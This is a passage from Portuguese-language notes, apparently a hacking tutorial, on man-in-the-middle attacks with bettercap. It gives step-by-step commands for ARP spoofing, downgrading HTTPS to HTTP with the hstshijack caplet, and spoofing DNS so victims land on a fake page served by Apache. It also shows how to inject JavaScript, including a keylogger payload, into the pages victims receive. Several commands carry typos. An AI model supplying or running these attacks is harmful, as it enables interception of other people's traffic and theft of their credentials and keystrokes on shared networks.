...
**Solução:** fazer um downgrade da página de HTTPS para HTTP.<br>
**Problema:** a página aparece para o cliente como não segura.

**Passo 1:**

Modificar o caplet de spoof (ataque HTTP), incluindo a linha: `set net.sniff.local true`
```
net.probe on
net.recon on
set arp.spoof.fullduplex true
...
Rodar o caplet *hstshijack*.
- Sem não funcionar, será necessário substituir o caplet default, pelo abaixo:
...
Rodar o bettercap com os caplets. Exemplo:
```
$ bettercap -iface wlan0n spoof.cap
192.168.1.0/24 > 192.168.1.10  »  hstshujack/hstshujack
```

---
### Ataque em DNS
---
**Objetivo:** redirecionar um domínio/página para uma página fake.

**Comentário:** o Kali já vem com um servidor apache instalado, apontando para o diretório `/var/www/html/`. Para iniciar o serviço:

`$ servive apache2 start`
```
$ bettercap -iface wlan0n spoof.cap
192.168.1.0/24 > 192.168.1.10  » set dns.spoof.all true
192.168.1.0/24 > 192.168.1.10  » set dns.spoof.domains {domínio 1, domínio 2, ...}
192.168.1.0/24 > 192.168.1.10  »  dns.spof on
```
**Para inserir um JavaScript nas páginas recebidas:**

1. Editar o *hstshijack* para incluir o script no playload - Linha: `set hstshijack.payloads` 

`set hstshijack.payloads  *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js, *:{JavaScript}`
